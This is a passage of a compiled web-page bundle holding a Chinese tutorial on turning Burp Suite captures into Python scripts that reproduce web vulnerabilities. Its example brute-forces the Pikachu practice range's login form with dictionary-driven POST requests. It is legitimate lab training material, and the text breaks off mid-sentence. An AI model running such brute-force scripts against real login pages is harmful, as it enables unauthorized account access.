import{_ as p}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as o,o as i,c as l,a as n,d as s,b as e,e as t}from"./app-DxMJFouC.js";const c={},r=t('<h1 id="web-漏洞通用型-python-复现脚本编写指南-v1-0" tabindex="-1"><a class="header-anchor" href="#web-漏洞通用型-python-复现脚本编写指南-v1-0"><span>Web 漏洞通用型 Python 复现脚本编写指南 V1.0</span></a></h1><h2 id="前言" tabindex="-1"><a class="header-anchor" href="#前言"><span>前言</span></a></h2><p>在复现 Web 漏洞的过程中通常会发 HTTP 请求来进行攻击, 这个操作是可以用 Python 的 requests, urllib, aiohttp, httpx 等网络请求库实现的(在此项指南中以 requests 库为例)</p><p>因此如果需要重复复现漏洞或是批量复现漏洞的话, 那么编写通用脚本, 之后需要的时候只需要跑脚本即可验证复现情况</p><p>此项指南旨在为上述过程的快速实现做一个常规的梳理, 希望能够帮助到有相关需求的同学</p><hr><h2 id="应用场景" tabindex="-1"><a class="header-anchor" href="#应用场景"><span>应用场景</span></a></h2><p>对于攻击方可以通过发 HTTP 请求进行复现的 Web 漏洞</p><p>可以通过编写 Python 脚本发 HTTP 请求实现浮现措施的归档以及复用或者进一步集成到大的自动化复现项目中</p><blockquote><p>PS: 对于 XSS 钓鱼攻击, CSRF 等针对用户的攻击, 不方便使用此种方式进行复现</p></blockquote><hr><h2 id="环境准备" tabindex="-1"><a class="header-anchor" href="#环境准备"><span>环境准备</span></a></h2><h3 id="brupsuit" tabindex="-1"><a class="header-anchor" href="#brupsuit"><span>BrupSuit</span></a></h3><p>BurpSuite是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手工地能更好的完成对web应用的渗透测试和攻击。在渗透测试中，我们使用Burp Suite将使得测试工作变得更加容易和方便，即使在不需要娴熟的技巧的情况下，只有我们熟悉Burp Suite的使用，也使得渗透测试工作变得轻松和高效。</p><p>在本指南中主要会使用 BurpSuit 的 Proxy 功能拦截网络请求, 使用其 Community 版本即可</p>',15),u={href:"https://portswigger.net/burp/releases/professional-community-2022-9-6?requestededition=community&requestedplatform=",target:"_blank",rel:"noopener noreferrer"},d={href:"https://ayusummer.github.io/DailyNotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/BurpSuite.html",target:"_blank",rel:"noopener noreferrer"},m=n("blockquote",null,[n("p",null,"Community 版本不支持保存项目也是当有重复复现需求时不使用 Burp 而是编写自动化验证脚本的原因之一")],-1),k=n("hr",null,null,-1),v=n("h3",{id:"python",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#python"},[n("span",null,"Python")])],-1),h={href:"https://www.python.org/downloads/",target:"_blank",rel:"noopener noreferrer"},b=n("hr",null,null,-1),g=t(`<p>个人平时使用的是 Python 3.8 及以上的版本, 只是写写脚本不需要像大型项目一样考虑适配等复杂问题的时候个人比较倾向于更新的版本</p><blockquote><p>不推荐使用 Python 2, Python 2 到 Python 3 的语法是不一样的, 很多库也无法适配</p></blockquote><hr><p>安装完 Python 之后可以考虑先换个源然后装下 <code>requests</code> 库</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># 将 pip 默认源更改为清华源</span>
pip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple/
<span class="token comment"># 看下是否生效</span>
pip config list
<span class="token comment"># 安装 requests 库</span>
pip <span class="token function">install</span> requests
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>换源是因为默认源在中国大陆访问速度会比较慢, 这时使用国内的源会比较好</p><p>如果在 VSCode 中的终端中运行安装库的命令出现类似于如下报错</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code>ERROR: Could not install packages due to an Environment: <span class="token namespace">[WinError 2]</span> 系统找不到指定的文件 : xxxxxxxxx <span class="token operator">-</span>&gt; xxxxx\\\\pythonxx\\\\Scripts\\\\xxx<span class="token punctuation">.</span>exe<span class="token punctuation">.</span>deleteme
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>那么就是权限问题, 请使用管理员方式打开 VSCode</p></blockquote>`,6),y={href:"https://ayusummer.github.io/DailyNotes/Language/Python/%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83.html",target:"_blank",rel:"noopener noreferrer"},_=n("hr",null,null,-1),f=n("h3",{id:"vscode",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#vscode"},[n("span",null,"VSCode")])],-1),x=n("p",null,[s("个人平时比较倾向于使用 VSCode 连接远程 Linux 系统以及编写 Python 工具或是开发前端项目, 在本指南中主要会用到 VSCode 中的 "),n("code",null,"RESTClinet"),s(", "),n("code",null,"Thunder Client"),s(", "),n("code",null,"Python"),s(" 扩展")],-1),w=n("hr",null,null,-1),q={href:"https://code.visualstudio.com/Download",target:"_blank",rel:"noopener noreferrer"},E=t(`<p>在下载按钮上右键复制链接, 或者点击下载后在浏览器下载或者是其他下载工具中可以找到软件下载的直链</p><p><img src="http://cdn.ayusummer233.top/img/20211119092740.png" alt="20211119092740"></p><p>复制该 URL 然后将 <code>/stable</code> 前的地址替换为国内镜像地址再进行下载即可, 如:</p><ul><li><p>原地址: <code>https://az764295.vo.msecnd.net/stable/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/VSCodeUserSetup-x64-1.62.3.exe</code></p><p>将 <code>az764295.vo.msecnd.net</code> 替换为 <code>vscode.cdn.azure.cn</code> 得到新地址:</p><p>新地址: <code>https://vscode.cdn.azure.cn/stable/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/VSCodeUserSetup-x64-1.62.3.exe</code></p><p>然后通过这个新地址下载即可</p></li></ul><hr><p>安装完 VSCode 之后可以新建一个文件夹或者打开要放置 Python 脚本的文件目录, 然后安装 <code>Thunder Client</code> 以及 <code>REST Client</code> 扩展</p><p><img src="http://cdn.ayusummer233.top/img/202211121845838.png" alt="image-20221112184548800"></p><p><img src="http://cdn.ayusummer233.top/img/202211121855782.png" alt="image-20221112185527753"></p><blockquote><p>VSCode 本身是比较轻量的, 基本上可以秒开, 因此如果电脑性能比较吃紧的话 VSCode 会是一个比较优秀的代码编辑器</p><p>不过 VSCode 有着强大的扩展商店, 如果安装了数量繁多的插件并且全局启用了他们, 那么想要流畅的打开 VSCode 可能也不是很容易</p><p>因此这里推荐对工作区(当前打开的文件目录或者是设置的VSCode工作区) 启用其需要的扩展来使得 VSCode 在打开相应的工作区时只加载本工作区中启用的扩展, 这样可以提高 VSCode 打开与运行的流畅度</p><p>安装扩展时默认是全局安装的, 因此安装完后可以先点击禁用按钮, 然后点击启用按钮的下拉菜单, 选择在 <code>启用(工作区)</code> 来在当前工作区启用该扩展</p><blockquote><p>Jetbrains 家的软件, 比如 IDEA, Pycharm 等 IDE 在对口的项目中的使用体验会比较好, 不过当内存及硬盘不太好时单单是启动后的建立 Index 的步骤就会花费不少时间</p></blockquote><p>需要汉化页面的话可以安装此扩展</p><p><img src="http://cdn.ayusummer233.top/img/202211121854691.png" alt="image-20221112185436630"></p></blockquote><p>在本教程的后续内容中将</p><ul><li>使用 REST Client 发送 BurpSuit 抓取的 HTTP 请求(以及拷贝 curl 命令并导入到 Thunder Client)</li><li>使用 Thunder Client (类似于使用 Postman)发送 HTTP 请求以及生成可供参考的其他语言的 HTTP 请求代码</li></ul><hr><h2 id="演示实例-以-pikachu-靶场基于表单的暴力破解为例" tabindex="-1"><a class="header-anchor" href="#演示实例-以-pikachu-靶场基于表单的暴力破解为例"><span>演示实例 - 以 pikachu 靶场基于表单的暴力破解为例</span></a></h2><hr><h3 id="手工复现漏洞并使用-burpsuit-拦截请求" tabindex="-1"><a class="header-anchor" href="#手工复现漏洞并使用-burpsuit-拦截请求"><span>手工复现漏洞并使用 BurpSuit 拦截请求</span></a></h3><p>打开 BurpSuit 的 Proxy 页面, 点击 <code>Open Browser</code> 按钮, BurpSuit 将会打开一个自带的 Chome 浏览器</p><p><img src="http://cdn.ayusummer233.top/img/202211121907549.png" alt="image-20221112190754507"></p><p><img src="http://cdn.ayusummer233.top/img/202211121907701.png" alt="image-20221112190634916"></p><p>访问 pikachu 靶场的 <code>基于表单的暴力破解</code> 页面</p><p><img src="http://cdn.ayusummer233.top/img/202211121908032.png" alt="image-20221112190827009"></p><p>在本题漏洞的复现中, 将会暴力破解一个没有额外限制的登录接口, 手工输入几次账密看看效果</p><p>在尝试了多次手动登录观察了返回信息后大概了解该自动化该流程的思路了</p><p><img src="http://cdn.ayusummer233.top/img/202211121912483.png" alt="image-20221112191214460"></p><p>那么此时打开 BurpSuit 的 Proxy 页面的 <code>intercept is off</code> 按钮将其切换为 <code>intercept is on</code> 的状态, 开始拦截登录请求</p><p><img src="http://cdn.ayusummer233.top/img/202211121913363.png" alt="image-20221112191311345"></p><p>开启 <code>Intercept</code> 后再在 pikachu 靶场的 <code>基于表单的暴力破解</code> 页面登录一次可以看到左上角页面在加载</p><p><img src="http://cdn.ayusummer233.top/img/202211121914485.png" alt="image-20221112191445465"></p><p>此时 BurpSuit 已经拦截到了此次请求</p><p><img src="http://cdn.ayusummer233.top/img/202211121917161.png" alt="image-20221112191516096"></p><p>该页面中的数据可以修改(也就是常说的用 Burp 改包), 之后可以</p><ul><li><p>点击 <code>Forward</code> 按钮, 继续发送 (已修改过) 的请求, 此时浏览器将继续发送 (在 Burp 中修改过的) 请求</p><p><img src="http://cdn.ayusummer233.top/img/202211121917721.png" alt="image-20221112191731693"></p></li><li><p>将通过 <code>在编辑区域右键 / 点击 Action 按钮 / 编辑区域右上角的三横线菜单 -&gt; Send to Repeater</code> 将请求发送到 <code>Repeater</code> 来重复 (修改并) 发送登录请求</p><p><img src="http://cdn.ayusummer233.top/img/202211121919666.png" alt="image-20221112191958641"></p><p>之后就可以在 Repeater 页面看到刚才的请求了</p><p><img src="http://cdn.ayusummer233.top/img/202211121921177.png" alt="image-20221112192141148"></p><p>可以在此处修改并点击编辑区域左上角的 <code>Send</code> 按钮发送 (修改后) 的请求</p><p>然后就可以在 <code>Response</code> 区域看到返回的响应内容了</p><p><img src="http://cdn.ayusummer233.top/img/202211121924085.png" alt="image-20221112192416040"></p><p>之后还可以使用 BurpSuit 的 Intruder 模块来进行自动化的暴力破解操作, 但是这里就不在赘述了</p><ul><li><p>一方面是因为本指南意不在此</p></li><li><p>另一方面是 Community 版本的爆破速度太慢了</p><blockquote><p>几个小时才能发送几百条的水平</p></blockquote></li></ul></li></ul><hr><h3 id="将-http-请求保存下来并使用-rest-clinet-发送并拷贝-linux-curl-命令" tabindex="-1"><a class="header-anchor" href="#将-http-请求保存下来并使用-rest-clinet-发送并拷贝-linux-curl-命令"><span>将 HTTP 请求保存下来并使用 REST Clinet 发送并拷贝 Linux curl 命令</span></a></h3><p>复制 BurpSuit Proxy 页面拦截到的登录请求信息, 也即</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/vul/burteforce/bf_form.php</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.2.31:9221</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">45</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://192.168.2.31:9221</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://192.168.2.31:9221/vul/burteforce/bf_form.php</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=4v6itaf5q06hhm24uiuvmdps67</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>

username=admin&amp;password=password&amp;submit=Login
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在 VSCode 打开的存放 Python 脚本并启用了 <code>REST Client</code> 和 <code>Thunder Client</code> 的工作区中新建一个文件并粘贴刚才复制的 HTTP 请求, 然后会在内容左上方看到一个 <code>Send Request</code> 按钮, 点击后即可在右侧 <code>Response</code> 区域看到响应结果</p><blockquote><p>文件名和后缀都不重要, 有辨识度即可</p></blockquote><p><img src="http://cdn.ayusummer233.top/img/202211121933661.png" alt="image-20221112193346625"></p><blockquote><p>这样就实现了把关键请求保存下来而不用使用 Professional 的 BurpSuit 保存工作区的功能</p><p>或者在 BurpSuit 中保存请求到文件</p><p><img src="http://cdn.ayusummer233.top/img/202211121955285.png" alt="image-20221112195503258"></p><p>一层层选目录不如直接复制文本</p><p><img src="http://cdn.ayusummer233.top/img/202211121955556.png" alt="image-20221112195554533"></p><p>存到文件里要用的话也还是要复制拷贝到 BurpSuit 用, 反而不如直接拿 REST Client 发送</p><hr></blockquote><p>在编辑区域右键, 点击 <code>Copy Request As CURL</code> 按钮即可复制该请求对应的 Linux Curl 命令</p><p><img src="http://cdn.ayusummer233.top/img/202211121937514.png" alt="image-20221112193709483"></p><blockquote><p>虽然在 BurpSuit 中也有拷贝 curl 命令</p><p><img src="http://cdn.ayusummer233.top/img/202211121957398.png" alt="image-20221112195708342"></p><p>但是拷贝的 curl 执行后无法获得登录请求的响应内容而是一些请求的基本信息</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token function">curl</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-k</span> <span class="token parameter variable">-X</span> <span class="token string">$&#39;POST&#39;</span> <span class="token punctuation">\\</span>
    <span class="token parameter variable">-H</span> <span class="token string">$&#39;Host: 192.168.2.31:9221&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Content-Length: 45&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Cache-Control: max-age=0&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Upgrade-Insecure-Requests: 1&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Origin: http://192.168.2.31:9221&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Referer: http://192.168.2.31:9221/vul/burteforce/bf_form.php&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Accept-Encoding: gzip, deflate&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Accept-Language: zh-CN,zh;q=0.9&#39;</span> <span class="token parameter variable">-H</span> <span class="token string">$&#39;Connection: close&#39;</span> <span class="token punctuation">\\</span>
    <span class="token parameter variable">-b</span> <span class="token string">$&#39;PHPSESSID=4v6itaf5q06hhm24uiuvmdps67&#39;</span> <span class="token punctuation">\\</span>
    --data-binary <span class="token string">$&#39;username=admin&amp;password=password&amp;submit=Login&#39;</span> <span class="token punctuation">\\</span>
    <span class="token string">$&#39;http://192.168.2.31:9221/vul/burteforce/bf_form.php&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/img/202211122006546.png" alt="image-20221112200609522"></p></blockquote><hr><h3 id="根据-curl-命令生成对应的可供参考的-python-代码" tabindex="-1"><a class="header-anchor" href="#根据-curl-命令生成对应的可供参考的-python-代码"><span>根据 curl 命令生成对应的可供参考的 Python 代码</span></a></h3><h4 id="使用-thunder-clinet" tabindex="-1"><a class="header-anchor" href="#使用-thunder-clinet"><span>使用 Thunder Clinet</span></a></h4><p>复制利用 REST Client 生成的登录请求对应的 curl 命令并导入到 Thunder Client 中</p><p><img src="http://cdn.ayusummer233.top/img/202211122009942.png" alt="image-20221112200923918"></p><p><img src="http://cdn.ayusummer233.top/img/202211122010952.png" alt="image-20221112201046896"></p><p>可以看到请求导入到 Thunder Client 后会生成类似于使用 Postman 发请求的页面并自动发出该请求</p><p>可以看到的是该次请求并没能获得想要的关键信息</p><p>这<mark>可能</mark>是因为 <code>Thunder Clinet</code> 对于 <mark><code>application/x-www-form-urlencoded</code></mark> 形式的参数解析有问题, 没能解析出对应的 body</p><p><img src="http://cdn.ayusummer233.top/img/202211122015364.png" alt="image-20221112201514340"></p><p>需要手动在 Body 页面中添加下参数, 具体参考 HTTP 请求的如下部分:</p><div class="language-http line-numbers-mode" data-ext="http" data-title="http"><pre class="language-http"><code>username=admin&amp;password=password&amp;submit=Login
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/img/202211122017802.png" alt="image-20221112201727768"></p><p>可以看到此次请求获取到了关键信息</p></blockquote><p>然后可以在 Response 区域点击 <code>Code Snippet</code> 按钮选择 Python 语言并使用 Requests 库生成对应的 Python 代码</p><p><img src="http://cdn.ayusummer233.top/img/202211122020222.png" alt="image-20221112202008193"></p><p>新建一个 <code>py</code> 文件并粘贴该代码, 然后运行</p><p><img src="http://cdn.ayusummer233.top/img/202211122037342.png" alt="image-20221112203654413"></p><p>这样在请求中就可以找到相应的关键信息了</p><p><img src="http://cdn.ayusummer233.top/img/202211122037975.png" alt="image-20221112203743948"></p><hr><h4 id="使用-curlconverter" tabindex="-1"><a class="header-anchor" href="#使用-curlconverter"><span>使用 <code>curlconverter</code></span></a></h4><p>在 VSCode 中安装 <code>curlconverter</code> 扩展</p><p><img src="http://cdn.ayusummer233.top/img/202211122018135.png" alt="image-20221112201833112"></p><p>利用 REST Client 复制 HTTP 请求为 cURL 命令到剪贴板, 新建一个 py 文件并打开, 在编辑区域右键并选择 <code>Paste cURL As Python</code></p><p><img src="http://cdn.ayusummer233.top/img/202211122043048.png" alt="image-20221112204353006"></p><p><img src="http://cdn.ayusummer233.top/img/202211122046890.png" alt="image-20221112204657852"></p><p>可以在最后一行添加一行输出语句以在终端中查看结果</p><div class="language-Python line-numbers-mode" data-ext="Python" data-title="Python"><pre class="language-Python"><code>print(response.text)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在终端中运行该 py 文件</p><p><img src="http://cdn.ayusummer233.top/img/202211122051344.png" alt="image-20221112205134317"></p><hr>`,73),C={href:"https://curlconverter.com/",target:"_blank",rel:"noopener noreferrer"},S=t(`<p><img src="http://cdn.ayusummer233.top/img/202211122054593.png" alt="image-20221112205413529"></p><hr><p><mark>至此我们就利用 BurpSuit 拦截的登录请求生成了一个基本的 Python 请求代码, 那么下面就是根据此代码进行相应的处理来实现实际的复现需求</mark></p><hr><h3 id="编写复现脚本" tabindex="-1"><a class="header-anchor" href="#编写复现脚本"><span>编写复现脚本</span></a></h3><h4 id="提取关键信息" tabindex="-1"><a class="header-anchor" href="#提取关键信息"><span>提取关键信息</span></a></h4><p>通常情况下我们并不需要完整的响应信息, 而是只需要其中的某些关键信息, 比如本例中的 <code>&lt;p&gt; username or password is not exists～&lt;/p&gt;</code></p><p>对于文本的匹配可能首先会想到正则, 不过这种没有明确规律的文本用正则匹配的话也是限定前后缀取中间部分的内容, 因此可以直接使用 <code>str.find</code> 来匹配前后缀获取内容</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">match_fix</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> prefix<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> suffix<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;匹配 reponse.text 中 prefix - suffix 中间的字符串并返回匹配结果 

    Args:
        text: 待匹配的字符串(一般为 request 请求的 response.text)  
        prefix: 匹配的前缀  
        suffix: 匹配的后缀

    Returns:
        匹配结果
    &quot;&quot;&quot;</span>
    <span class="token keyword">return</span> text<span class="token punctuation">[</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>比如这里就可以这样用</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code>match_result <span class="token operator">=</span> match_fix<span class="token punctuation">(</span>reponse_text<span class="token punctuation">,</span> prefix<span class="token operator">=</span><span class="token string">&quot;&lt;/form&gt;\\n        &lt;p&gt; &quot;</span><span class="token punctuation">,</span> suffix<span class="token operator">=</span><span class="token string">&quot;&lt;/p&gt;\\n\\n    &lt;/div&gt;&lt;!-- /.widget-&quot;</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h4 id="根据复现逻辑继续编写脚本" tabindex="-1"><a class="header-anchor" href="#根据复现逻辑继续编写脚本"><span>根据复现逻辑继续编写脚本</span></a></h4><p>暴力破解首先需要有账密字典, 可以是弱密码字典, 也可以是社工字典, 亦可以是根据密码生成规则自定义构造的字典</p><p>那么可以将字典文件放入工作区, 假设这些字典每一行对应一个 账号/密码, 那么可以定义一个读字典生成账号/密码列表的函数</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">read_dict_to_list</span><span class="token punctuation">(</span>dict_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;读取字典文件到列表

    Args:
        dict_path: 字典文件路径(绝对路径)(可以使用 os.path.join 或者 pathlib 进行拼接)

    Returns:
        字典内容列表
    &quot;&quot;&quot;</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>dict_path<span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token comment"># 按行读取并去除换行符</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p>将刚才生成的 Python 请求代码进行优化并封装成函数</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">post_request</span><span class="token punctuation">(</span>
        socket<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> url_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> 
        user_gent<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
        username<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> password<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>
        prefix<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> suffix<span class="token punctuation">:</span> <span class="token builtin">str</span>
    <span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;携带账密发送一次 post 请求获取 response, 并根据前后缀匹配出 reponse 中实际有效的部分
    (比如本例中的 username or password is not exist ~ 和 login success)    

    适用于 http 请求, 无前置校验,
    数据格式为表单数据编码(Form-Encode也即 content-type:application/x-www-form-urlencoded)形式  

    在 pyload 上如果除了 username 和 password 之外还有其他参数
    (如此函数中的 submit=Login)(一般是用于标识登录操作的), 请相应修改此函数中的 payload 项

    Args:
        socket: socket 地址, host-ip:port 的形式  
        url_path: url 路径, 为 url 中 port 后面的 /path 部分  
        user_gent: user-agent  
        username: 账号  
        password: 密码  
        prefix: 匹配的前缀
        suffix: 匹配的后缀

    Returns:
        响应结果
    &quot;&quot;&quot;</span>
    <span class="token comment"># 请求头</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;content-type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;user-agent&quot;</span><span class="token punctuation">:</span> user_gent
    <span class="token punctuation">}</span>
    <span class="token comment"># 请求地址</span>
    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;http://</span><span class="token interpolation"><span class="token punctuation">{</span>socket<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>url_path<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
    <span class="token comment"># 请求数据</span>
    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;username=</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">&amp;password=</span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token string">&amp;submit=Login&quot;</span></span>
    <span class="token comment"># 发送请求并返回响应结果</span>
    reponse_text <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token comment"># 匹配出响应结果中实际有效的部分</span>
    match_result <span class="token operator">=</span> match_fix<span class="token punctuation">(</span>reponse_text<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> suffix<span class="token punctuation">)</span>
    <span class="token keyword">return</span> match_result
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,19),P=n("p",null,[s("这里精简了请求头, 因为在本题中后端只需要这些参数就够了, 甚至 